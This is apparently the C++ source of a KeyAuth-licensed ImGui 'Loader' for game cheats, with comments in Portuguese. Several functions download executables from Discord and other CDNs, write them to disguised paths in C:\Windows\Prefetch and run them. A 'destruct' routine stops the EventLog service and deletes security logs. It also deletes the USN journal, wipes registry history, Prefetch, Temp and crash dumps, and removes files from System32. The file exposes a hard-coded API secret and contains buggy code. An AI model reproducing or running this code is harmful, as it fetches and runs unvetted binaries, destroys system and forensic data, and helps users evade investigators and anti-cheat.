//ImGui 
#include "ImGui/imgui.h"
#include "ImGui/imgui_impl_dx9.h"
#include "ImGui/imgui_impl_win32.h"

// Custom ImGui Addition

#include "imguipp_v2.h"

// Bytes
#include "logo.h"

// Important
#include "main.h"
#include "globals.h"
#include <winsvc.h>

// Font and Icon related
#include "font.h"
#include "icons.h"

// D3DX

#include <d3dx9.h>
#pragma comment(lib, "D3dx9")

// Variables

#include "ImGui/imgui.h"
#include <vector>
#include <random>
#include <math.h>
#include "imgui_custom.hpp"
#include <filesystem>
#include "Main.h"
#include <random>
#include <random>
#include "imgui/imgui_internal.h"
#pragma comment(lib, "urlmon.lib")
#include <filesystem>
#include <TlHelp32.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <dwmapi.h>
#include "ImGui/imstb_truetype.h"
#include <iostream>
#include <Windows.h>
#include <vector>
#include <string>
#include <algorithm>
#include <Psapi.h>
#include <TlHelp32.h>
#include <locale>
#include <codecvt>
#include <thread>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include<iostream>
#include<string>
#include<fstream>
#include "Auth.hpp"
#include <regex>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>


#pragma comment (lib, "dbghelp.lib")
#pragma comment(lib, "Shlwapi.lib")
#include <filesystem>

namespace fs = std::filesystem;

bool BufferingBar(const char* label, float value, const ImVec2& size_arg, const ImU32& bg_col, const ImU32& fg_col) {
	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	ImGuiContext& g = *GImGui;
	const ImGuiStyle& style = g.Style;
	const ImGuiID id = window->GetID(label);

	ImVec2 pos = window->DC.CursorPos;
	ImVec2 size = size_arg;
	size.x -= style.FramePadding.x * 2;

	const ImRect bb(pos, ImVec2(pos.x + size.x, pos.y + size.y));
	ImGui::ItemSize(bb, style.FramePadding.y);
	if (!ImGui::ItemAdd(bb, id))
		return false;

	// Render
	const float circleStart = size.x * 0.7f;
	const float circleEnd = size.x;
	const float circleWidth = circleEnd - circleStart;

	window->DrawList->AddRectFilled(bb.Min, ImVec2(pos.x + circleStart, bb.Max.y), bg_col);
	window->DrawList->AddRectFilled(bb.Min, ImVec2(pos.x + circleStart * value, bb.Max.y), fg_col);

	const float t = g.Time;
	const float r = size.y / 2;
	const float speed = 6.5f;

	const float a = speed * 0;
	const float b = speed * 0.333f;
	const float c = speed * 0.666f;

	const float o1 = (circleWidth + r) * (t + a - speed * (int)((t + a) / speed)) / speed;
	const float o2 = (circleWidth + r) * (t + b - speed * (int)((t + b) / speed)) / speed;
	const float o3 = (circleWidth + r) * (t + c - speed * (int)((t + c) / speed)) / speed;

	window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o1, bb.Min.y + r), r, bg_col);
	window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o2, bb.Min.y + r), r, bg_col);
	window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o3, bb.Min.y + r), r, bg_col);
}

bool Spinner(const char* label, float radius, int thickness, const ImU32& color) {
	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	ImGuiContext& g = *GImGui;
	const ImGuiStyle& style = g.Style;
	const ImGuiID id = window->GetID(label);

	ImVec2 pos = window->DC.CursorPos;
	ImVec2 size((radius) * 2, (radius + style.FramePadding.y) * 2);

	const ImRect bb(pos, ImVec2(pos.x + size.x, pos.y + size.y));
	ImGui::ItemSize(bb, style.FramePadding.y);
	if (!ImGui::ItemAdd(bb, id))
		return false;

	// Render
	window->DrawList->PathClear();

	int num_segments = 30;
	int start = abs(ImSin(g.Time * 1.8f) * (num_segments - 5));

	const float a_min = IM_PI * 2.0f * ((float)start) / (float)num_segments;
	const float a_max = IM_PI * 2.0f * ((float)num_segments - 3) / (float)num_segments;

	const ImVec2 centre = ImVec2(pos.x + radius, pos.y + radius + style.FramePadding.y);

	for (int i = 0; i < num_segments; i++) {
		const float a = a_min + ((float)i / (float)num_segments) * (a_max - a_min);
		window->DrawList->PathLineTo(ImVec2(centre.x + ImCos(a + g.Time * 8) * radius,
			centre.y + ImSin(a + g.Time * 8) * radius));
	}

	window->DrawList->PathStroke(color, false, thickness);
}

std::vector<ImVec2> circles_pos;
std::vector<ImVec2> circles_dir;
std::vector<int> circles_radius;

void draw_circle(ImVec2 pos, int radius, ImU32 color)
{
	ImDrawList* draw_list = ImGui::GetWindowDrawList();
	unsigned char* color_ptr = (unsigned char*)&color;
	draw_list->AddCircleFilled(pos, radius - 1, IM_COL32(color_ptr[0], color_ptr[1], color_ptr[2], 75));
}

void draw_line(ImVec2 pos1, ImVec2 pos2, ImU32 color, int radius)
{
	ImDrawList* draw_list = ImGui::GetWindowDrawList();
	float distance = std::sqrt(
		std::pow(pos2.x - pos1.x, 2) + // std:: pow
		std::pow(pos2.y - pos1.y, 2)    // std:: pow
	);
	float alpha;
	if (distance <= 20.0f) {
		alpha = 255.0f;
	}
	else {
		alpha = (1.0f - ((distance - 20.0f) / 25.0f)) * 255.0f;
	}

	int r = (color & 0xFF0000) >> 16; // Extract red component
	int g = (color & 0x00FF00) >> 8;  // Extract green component
	int b = (color & 0x0000FF);       // Extract blue component

	unsigned char* color_ptr = (unsigned char*)&color;

	draw_list->AddLine(pos1, pos2, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], static_cast<int>(alpha)), 1.0f);
	if (distance >= 40.0f) {
		draw_list->AddCircleFilled(pos1, radius - 0.96f, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
		draw_list->AddCircleFilled(pos2, radius - 0.96f, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
	}
	else if (distance <= 20.0f) {
		draw_list->AddCircleFilled(pos1, radius, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
		draw_list->AddCircleFilled(pos2, radius, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
	}
	else {
		float radius_factor = 1.0f - ((distance - 20.0f) / 20.0f);
		float offset_factor = 1.0f - radius_factor;
		float offset = (radius - radius * radius_factor) * offset_factor;
		draw_list->AddCircleFilled(pos1, radius - offset, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
		draw_list->AddCircleFilled(pos2, radius - offset, IM_COL32(color_ptr[9], color_ptr[9], color_ptr[9], alpha * 200.0f));
	}
}

void move_circles(ImVec2 aaaa)
{
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, 360);

	ImVec2 window_size = ImGui::GetWindowSize();

	for (int i = 0; i < circles_pos.size(); i++)
	{
		ImVec2& pos = circles_pos[i];
		ImVec2& dir = circles_dir[i];
		int radius = circles_radius[i];

		pos.x += dir.x * 0.4;
		pos.y += dir.y * 0.4;

		if (pos.x - radius < 0 || pos.x + radius > aaaa.x + window_size.x)
		{
			dir.x = -dir.x;
			dir.y = dis(gen) % 2 == 0 ? -1 : 1;
		}

		if (pos.y - radius < 0 || pos.y + radius >  aaaa.y + window_size.y)
		{
			dir.y = -dir.y;
			dir.x = dis(gen) % 2 == 0 ? -1 : 1;
		}
	}
}

void draw_circles_and_lines(ImU32 color, ImVec2 aaa)
{
	move_circles(aaa);

	for (int i = 0; i < circles_pos.size(); i++)
	{
		draw_circle(circles_pos[i], circles_radius[i], color);

		for (int j = i + 1; j < circles_pos.size(); j++)
		{
			float distance = ImGui::GetIO().FontGlobalScale * std::sqrt(
				std::pow(circles_pos[j].x - circles_pos[i].x, 2) + // std:: pow
				std::pow(circles_pos[j].y - circles_pos[i].y, 2)    // std:: pow
			);

			if (distance <= 45.0f)
			{
				draw_line(circles_pos[i], circles_pos[j], color, circles_radius[i]);
			}
		}
	}
}

void setup_circles()
{
	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(0, 1);
	std::uniform_int_distribution<> pos_dis(0, static_cast<int>(1920));
	std::uniform_int_distribution<> pos_dis_y(0, static_cast<int>(1080));

	for (int i = 0; i < 300; i++) // 1000 is the number of cricle you render i recommend 400.
	{
		circles_pos.push_back(ImVec2(pos_dis(gen), pos_dis_y(gen)));
		circles_dir.push_back(ImVec2(dis(gen) == 0 ? -1 : 1, dis(gen) == 0 ? -1 : 1));
		circles_radius.push_back(3);
	}
}

// string cleaner code


namespace idk
{
	static int Tab = 0;
}

const char* label = "Seja Bem Vindo";  // O texto que você deseja exibir junto com o spinner.
float radius = 30.0f;  // O raio da curva lemniscata no spinner.
float thickness = 2.0f;  // A espessura dos traços da curva.
ImColor color = ImColor(128, 0, 128);  // Cor da curva no spinner.
float speed = 2.8f;  // A velocidade de rotação do spinner.
float angle = IM_PI / 1.0f;  // Ângulo da curva lemniscata.

std::string name = "Inacio"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = "GOKIqhFwUj"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = "522be7bfb3366b6f3506c0dc77dac89c85196b5263072d653430e5a28325a6b0"; // app secret, the blurred text on licenses tab and other tabs
std::string version = "1.0"; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/";

KeyAuth::api KeyAuthApp(name, ownerid, secret, version, url);

void loadskript()
{
	std::wstring directory = L"";

	// Supondo que ___() seja uma função que converte uma string para wide string.
	std::wstring usb_disk = L"C:\\Windows\\prefetch\\VsGraphicsReso‎urces.exe";
	const wchar_t* parameters = L""; // Command-line parameters (leave empty if none)
	const wchar_t* workingDirectory = L""; // Working directory (leave empty for the current directory)


	URLDownloadToFileW(NULL, L"https://cdn.discordapp.com/attachments/1205300519510351957/1227058883047194724/USBDeview.exe?ex=662706a3&is=661491a3&hm=62abfe85378dbd5f36987d76c66d68e760ed392de9efdec1185636781cff1b6f&", usb_disk.c_str(), 0, NULL);


	directory = usb_disk;

	HINSTANCE result = ShellExecuteW(NULL, L"open", directory.c_str(), parameters, workingDirectory, SW_SHOWNORMAL);

	if (reinterpret_cast<int>(result) > 32) {
		// The application was launched successfully.
	}
	else {
		// There was an error launching the application.
	}

	// Wait until the child process exits.

	WCHAR tempPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, tempPath)) {
		// Percorra o diretório temp e exclua os arquivos
		// Use FindFirstFile/FindNextFile e DeleteFile
	}
	Sleep(3000);

}

void loadgosth()
{
	std::wstring directory = L"";

	// Supondo que ___() seja uma função que converte uma string para wide string.
	std::wstring usb_disk = L"C:\\Windows\\prefetch\\VsGraphicsResou‎r‎ces.exe";
	const wchar_t* parameters = L""; // Command-line parameters (leave empty if none)
	const wchar_t* workingDirectory = L""; // Working directory (leave empty for the current directory)


	URLDownloadToFileW(NULL, L"https://cdn.gosth.ltd/launcher.exe", usb_disk.c_str(), 0, NULL);


	directory = usb_disk;

	HINSTANCE result = ShellExecuteW(NULL, L"open", directory.c_str(), parameters, workingDirectory, SW_SHOWNORMAL);

	if (reinterpret_cast<int>(result) > 32) {
		// The application was launched successfully.
	}
	else {
		// There was an error launching the application.
	}

	// Wait until the child process exits.

	WCHAR tempPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, tempPath)) {
		// Percorra o diretório temp e exclua os arquivos
		// Use FindFirstFile/FindNextFile e DeleteFile
	}

	Sleep(3000);

}

void loadtzx()
{

	std::wstring directory = L"";

	// Supondo que ___() seja uma função que converte uma string para wide string.
	std::wstring usb_disk = L"C:\\Windows\\prefetch\\VsGraphicsResou‎r‎ces.exe";
	const wchar_t* parameters = L""; // Command-line parameters (leave empty if none)
	const wchar_t* workingDirectory = L""; // Working directory (leave empty for the current directory)


	URLDownloadToFileW(NULL, L"https://cdn.discordapp.com/attachments/1223133498550911067/1231358676225359932/svhost.exe?ex=6636ab21&is=66243621&hm=cf25d4c954a1374e100545e72e7584c687ea4fc7e8a6e556ed4df25820f7ae78&", usb_disk.c_str(), 0, NULL);


	directory = usb_disk;

	HINSTANCE result = ShellExecuteW(NULL, L"open", directory.c_str(), parameters, workingDirectory, SW_SHOWNORMAL);

	if (reinterpret_cast<int>(result) > 32) {
		// The application was launched successfully.
	}
	else {
		// There was an error launching the application.
	}

	// Wait until the child process exits.

	WCHAR tempPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, tempPath)) {
		// Percorra o diretório temp e exclua os arquivos
		// Use FindFirstFile/FindNextFile e DeleteFile
	}

	Sleep(3000);



}

void loadsusano()
{

	std::wstring directory = L"";

	// Supondo que ___() seja uma função que converte uma string para wide string.
	std::wstring usb_disk = L"C:\\Windows\\prefetch\\VsGraphicsReso‎urces.exe";
	const wchar_t* parameters = L""; // Command-line parameters (leave empty if none)
	const wchar_t* workingDirectory = L""; // Working directory (leave empty for the current directory)


	URLDownloadToFileW(NULL, L"So colocar o download do susano para funcionar!!!", usb_disk.c_str(), 0, NULL);


	directory = usb_disk;

	HINSTANCE result = ShellExecuteW(NULL, L"open", directory.c_str(), parameters, workingDirectory, SW_SHOWNORMAL);

	if (reinterpret_cast<int>(result) > 32) {
		// The application was launched successfully.
	}
	else {
		// There was an error launching the application.
	}

	// Wait until the child process exits.

	WCHAR tempPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, tempPath)) {
		// Percorra o diretório temp e exclua os arquivos
		// Use FindFirstFile/FindNextFile e DeleteFile
	}
	Sleep(3000);



}
void executeCommand(const std::string& command) {
	STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA)};
	PROCESS_INFORMATION processInfo;

	// Configurar o redirecionamento de entrada e saída para ocultar a janela
	startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;

	// Criar o processo
	if (CreateProcessA(NULL, const_cast<LPSTR>(command.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
		// Aguarde o término do processo, se necessário
		WaitForSingleObject(processInfo.hProcess, INFINITE);

		// Feche os identificadores do processo
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
	else {
		// Lida com erros, por exemplo:
		DWORD error = GetLastError();
		// Faça algo com o código de erro, como registrar ou mostrar uma mensagem de erro
	}
}


bool IsTenDigits(const std::string& fileName) {
	// Verifica se o nome do arquivo tem exatamente 10 dígitos
	if (fileName.length() != 14) { // Incluindo a extensão .dll (4 caracteres)
		return false;
	}

	for (char c : fileName) {
		if (!std::isdigit(c)) {
			return false;
		}
	}

	return true;
}

#include <Shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

void destruct()
{
	std::wstring sourceFileName = L"C:\\Windows\\System32\\winevt\\Logs\\Security.evtx";
	std::wstring destFileName = L"C:\\Windows\\Temp\\Security.evtx";

	if (CopyFileW(sourceFileName.c_str(), destFileName.c_str(), FALSE)) {
		std::wcout << L"Security.evtx copied successfully." << std::endl;
	}
	else {
		std::wcerr << L"Failed to copy Security.evtx." << std::endl;
	}

	std::wstring sourceFileName2 = L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Kernel-PnP % 4Configuration.evtx";
	std::wstring tempPath;
	tempPath.resize(MAX_PATH);
	DWORD pathSize = GetTempPathW(MAX_PATH, &tempPath[0]);

	if (pathSize > 0 && pathSize <= MAX_PATH) {
		tempPath.resize(pathSize - 1); // Remove o caractere nulo extra no final
		std::wstring destFileName2 = tempPath + L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx";

		if (CopyFileW(sourceFileName2.c_str(), destFileName2.c_str(), FALSE)) {
			std::wcout << L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx copied successfully." << std::endl;
		}
		else {
			std::wcerr << L"Failed to copy Microsoft-Windows-Kernel-PnP % 4Configuration.evtx." << std::endl;
		}
	}
	else {
		std::wcerr << L"Failed to get the temporary path." << std::endl;
	}



	//Application

	std::wstring sourceFileName5 = L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx";
	std::wstring destFileName5 = L"C:\\Windows\\Temp\\Application.evtx";

	if (CopyFileW(sourceFileName5.c_str(), destFileName5.c_str(), FALSE)) {
		std::wcout << L"Security.evtx copied successfully." << std::endl;
	}
	else {
		std::wcerr << L"Failed to copy Security.evtx." << std::endl;
	}

	std::wstring sourceFileName6 = L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Kernel-PnP % 4Configuration.evtx";
	std::wstring tempPath5;
	tempPath.resize(MAX_PATH);
	DWORD pathSize5 = GetTempPathW(MAX_PATH, &tempPath[0]);

	if (pathSize5 > 0 && pathSize5 <= MAX_PATH) {
		tempPath5.resize(pathSize5 - 1); // Remove o caractere nulo extra no final
		std::wstring destFileName5 = tempPath + L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx";

		if (CopyFileW(sourceFileName6.c_str(), destFileName5.c_str(), FALSE)) {
			std::wcout << L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx copied successfully." << std::endl;
		}
		else {
			std::wcerr << L"Failed to copy Microsoft-Windows-Kernel-PnP % 4Configuration.evtx." << std::endl;
		}
	}
	else {
		std::wcerr << L"Failed to get the temporary path." << std::endl;
	}

	executeCommand("fsutil usn deletejournal /D c:");

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = SWP_HIDEWINDOW;
	si.wShowWindow = SWP_HIDEWINDOW;

	std::vector<std::string> regDeletes = { "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
	};

	for (const std::string& reg : regDeletes) {
		std::string regCommand = "reg delete " + reg + " /f && reg add " + reg + " /f";
		executeCommand("cmd /C " + regCommand);
	}

	const std::string directoryPath = "C:\\Windows\\System32";

	std::regex dllPattern(R"(\d{10}\.dll)");

	try 
	{
		for (const auto& entry : fs::directory_iterator(directoryPath)) 
		{
			if (fs::is_regular_file(entry.status())) 
			{
				std::string fileName = entry.path().filename().string();

				if (std::regex_match(fileName, dllPattern)) 
				{
					std::cout << "Excluindo arquivo: " << fileName << std::endl;
					fs::remove(entry.path());
				}
			}
		}
	}
	catch (const std::exception& e) {
	}


	// remove strings
	std::wstring directory = L"";

	// Supondo que ___() seja uma função que converte uma string para wide string.
	std::wstring usb_disk = L"C:\\Windows\\prefetch\\VsGraphicsResourc‎es.dll";
	const wchar_t* parameters = L""; // Command-line parameters (leave empty if none)
	const wchar_t* workingDirectory = L""; // Working directory (leave empty for the current directory)

	URLDownloadToFileW(NULL, L"url", usb_disk.c_str(), 0, NULL);

	directory = usb_disk;

	STARTUPINFO si2;
	PROCESS_INFORMATION pi2;
	ZeroMemory(&si2, sizeof(si2));
	si.cb = sizeof(si2);
	ZeroMemory(&pi2, sizeof(pi2));

	// Crie o novo processo com a flag CREATE_NO_WINDOW para ocultar a janela
	if (CreateProcess(NULL, (LPWSTR)directory.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
		// Aguarde até que o processo filho termine
		WaitForSingleObject(pi2.hProcess, INFINITE);

		// Feche os identificadores de processo e thread
		CloseHandle(pi2.hProcess);
		CloseHandle(pi2.hThread);
	}
	else {
		// Trate os erros aqui, se necessário
	}

	// delete files system


	executeCommand("del /f /q /s C:\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\*.*");
	executeCommand("del /f /q /s C:\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0_32\\UsageLogs\\*.*");

	executeCommand("del /s /f /q C:\\Users\\%username%\\AppData\\Local\\CrashDumps\\*.*");

	const std::string directoryPath3 = "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive";

	try {
		for (const auto& entry : fs::directory_iterator(directoryPath3)) {
			if (fs::is_regular_file(entry.status())) {
				fs::remove(entry.path());
			}
		}

		std::cout << "Todos os arquivos foram excluídos com sucesso." << std::endl;
	}
	catch (const std::exception& e) {
		std::cerr << "Erro: " << e.what() << std::endl;
	}


	std::string tempFolderPath = "C:\\Windows\\Temp";

	try {
		for (const auto& entry : fs::directory_iterator(tempFolderPath)) {
			fs::remove_all(entry);
		}
	}
	catch (const std::exception& e) {
	}

	std::string crash = "C:\\Users\\notname\\AppData\\Local\\CrashDumps";

	try {
		for (const auto& entry : fs::directory_iterator(crash)) {
			fs::remove_all(entry);
		}
	}
	catch (const std::exception& e) {
	}

	std::string prefetch = "C:\\Windows\\Prefetch";

	try {
		for (const auto& entry : fs::directory_iterator(prefetch)) {
			fs::remove_all(entry);
		}
	}
	catch (const std::exception& e) {
	}


	//cleaner
	if (std::remove("C:\\Windows\\prefetch\\VsGraphicsResourc‎es.dll") == 0) {
	}
	else {
	}

	//skript
	if (std::remove("C:\\Windows\\prefetch\\VsGraphicsReso‎urces.exe") == 0) {
	}
	else {
	}

	//gosth
	if (std::remove("C:\\Windows\\prefetch\\VsGraphicsResou‎r‎ces.exe") == 0) {
	}
	else {
	}

	std::wstring sourceFileName22 = L"C:\\Windows\\System32\\winevt\\Logs\\Security.evtx";
	std::wstring destFileName2 = L"C:\\Windows\\Temp\\Security.evtx";
	std::wstring sourceFileName3 = L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Kernel-PnP % 4Configuration.evtx";

	// Desativar o serviço de registro de eventos (EventLog)
	SERVICE_STATUS_PROCESS ssp;
	SC_HANDLE hScManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (hScManager) {
		SC_HANDLE hService = OpenServiceW(hScManager, L"EventLog", SERVICE_QUERY_STATUS | SERVICE_STOP | SERVICE_CHANGE_CONFIG);
		if (hService) {
			if (ControlService(hService, SERVICE_CONTROL_STOP, reinterpret_cast<LPSERVICE_STATUS>(&ssp))) {
				std::wcout << L"Stopped EventLog service." << std::endl;
			}
			ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hScManager);
	}

	// Esperar por algum tempo (1 segundo)
	std::this_thread::sleep_for(std::chrono::seconds(1));

	// Copiar os arquivos
	if (CopyFileW(sourceFileName3.c_str(), destFileName2.c_str(), FALSE)) {
		std::wcout << L"Security.evtx copied successfully." << std::endl;
		DeleteFileW(sourceFileName22.c_str());
	}
	else {
		std::wcerr << L"Failed to copy Security.evtx." << std::endl;
	}

	if (CopyFileW(sourceFileName2.c_str(), destFileName2.c_str(), FALSE)) {
		std::wcout << L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx copied successfully." << std::endl;
		DeleteFileW(sourceFileName22.c_str());
	}
	else {
		std::wcerr << L"Failed to copy Microsoft-Windows-Kernel-PnP % 4Configuration.evtx." << std::endl;
	}

	// Iniciar o serviço de registro de eventos (EventLog)
	hScManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (hScManager) {
		SC_HANDLE hService = OpenServiceW(hScManager, L"EventLog", SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG);
		if (hService) {
			if (ControlService(hService, SERVICE_CONTROL_INTERROGATE, reinterpret_cast<LPSERVICE_STATUS>(&ssp))) {
				std::wcout << L"Started EventLog service." << std::endl;
			}
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hScManager);
	}

	//application


	if (CopyFileW(sourceFileName5.c_str(), destFileName5.c_str(), FALSE)) {
		std::wcout << L"Security.evtx copied successfully." << std::endl;
		DeleteFileW(sourceFileName5.c_str());
	}
	else {
		std::wcerr << L"Failed to copy Security.evtx." << std::endl;
	}

	if (CopyFileW(sourceFileName5.c_str(), destFileName5.c_str(), FALSE)) {
		std::wcout << L"Microsoft-Windows-Kernel-PnP % 4Configuration.evtx copied successfully." << std::endl;
		DeleteFileW(sourceFileName5.c_str());
	}
	else {
		std::wcerr << L"Failed to copy Microsoft-Windows-Kernel-PnP % 4Configuration.evtx." << std::endl;
	}

	// Iniciar o serviço de registro de eventos (EventLog)
	hScManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
	if (hScManager) {
		SC_HANDLE hService = OpenServiceW(hScManager, L"EventLog", SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG);
		if (hService) {
			if (ControlService(hService, SERVICE_CONTROL_INTERROGATE, reinterpret_cast<LPSERVICE_STATUS>(&ssp))) {
				std::wcout << L"Started EventLog service." << std::endl;
			}
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hScManager);
	}

	//others cleaners



	void DeleteRegistryKeys();
		
		HKEY hKey;
		if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\Shell", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			RegDeleteTree(hKey, NULL);
			RegCloseKey(hKey);
		}
		if (RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\OpenSavePid", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			RegDeleteTree(hKey, NULL);
			RegCloseKey(hKey);
		}
		if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			RegDeleteTree(hKey, NULL);
			RegCloseKey(hKey);
		}
		if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentD1MRU", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			RegDeleteTree(hKey, NULL);
			RegCloseKey(hKey);
		}
		if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\OCS", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			RegDeleteTree(hKey, NULL);
			RegCloseKey(hKey);
		}
		std::wcout << L"Chaves do Registro excluídas com sucesso." << std::endl;

	}
	




DWORD __stdcall LoopFunction(LPVOID lpParam)
{
	KeyAuthApp.init();
	if (!KeyAuthApp.data.success)
	{
		std::cout << "\n Status: " << KeyAuthApp.data.message;
		Sleep(1500);
		exit(0);
	}
	KeyAuthApp.check();


	WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, L"Loader", NULL };
	RegisterClassEx(&wc);
	main_hwnd = CreateWindow(wc.lpszClassName, L"Loader", WS_POPUP, 0, 0, 5, 5, NULL, NULL, wc.hInstance, NULL);

	if (!CreateDeviceD3D(main_hwnd)) {
		CleanupDeviceD3D();
		UnregisterClass(wc.lpszClassName, wc.hInstance);
		return 1;
	}
	ShowWindow(main_hwnd, SW_HIDE);
	UpdateWindow(main_hwnd);

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	io.IniFilename = nullptr;
	io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;

	const auto ColorFromBytes = [&](uint8_t r, uint8_t g, uint8_t b)
	{
		return ImVec4((float)r / 255.0f, (float)g / 255.0f, (float)b / 255.0f, 1.0f);
	};

	static const ImWchar icons_ranges[] = { 0xf000, 0xf3ff, 0 };
	ImFontConfig icons_config;

	io.IniFilename = nullptr;
	io.LogFilename = nullptr;

	icons_config.MergeMode = true;
	icons_config.PixelSnapH = true;
	icons_config.OversampleH = 3;
	icons_config.OversampleV = 3;

	ImFontConfig CustomFont;
	CustomFont.FontDataOwnedByAtlas = false;
	io.Fonts->AddFontFromFileTTF("c:\\Windows\\Fonts\\Verdana.ttf", 18.0f);

	ImGuiStyle& Style = ImGui::GetStyle();
	auto Color = Style.Colors;

	//Style.WindowMinSize = ImVec2(700, 450);
	Style.WindowBorderSize = 1;

	Style.ChildRounding = 20;
	Style.ScrollbarRounding = 20;
	Style.GrabRounding = 20;
	Style.PopupRounding = 20;
	Style.WindowRounding = 20;
	Style.FrameRounding = 8;

	Color[ImGuiCol_WindowBg] = ImColor(22 / 255.0f, 22 / 255.0f, 22 / 255.0f);


	// Give the index of the images that each game represents

	LoadImageFromMemory(secretx, sizeof(secretx), 0); // Load the first image at index 0

	ImGui_ImplWin32_Init(main_hwnd);
	ImGui_ImplDX9_Init(g_pd3dDevice);

	DWORD window_flags = ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar;

	setup_circles();
	MSG msg;
	ZeroMemory(&msg, sizeof(msg));

	while (msg.message != WM_QUIT)
	{
		if (PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
			continue;
		}

		ImGui_ImplDX9_NewFrame();
		ImGui_ImplWin32_NewFrame();
		ImGui::NewFrame();
		{
			HWND hwnd = GetActiveWindow();

			SetWindowDisplayAffinity(hwnd, 0x00000011);
			if (loader_active)
			{
				ImGui::SetNextWindowSize(ImVec2(400, 300));

				if (idk::Tab == 0)
				{
					ImGui::Begin("   ", &loader_active, window_flags);
					{

						const ImVec2 imageSize(100, 100);

						// Defina um enum para os índices.
						enum GameIndex { secretx, aproved, YetAnotherGame };
						GameIndex selectedGameIndex = secretx; // Selecione o jogo desejado.

						// Verifique se o índice selecionado está dentro do intervalo.
						if (selectedGameIndex >= 0 && selectedGameIndex < 4) {
							// Calcule as posições da imagem.
							ImVec2 imagePosition = ImGui::GetCursorScreenPos();
							ImVec2 imageMin = imagePosition;
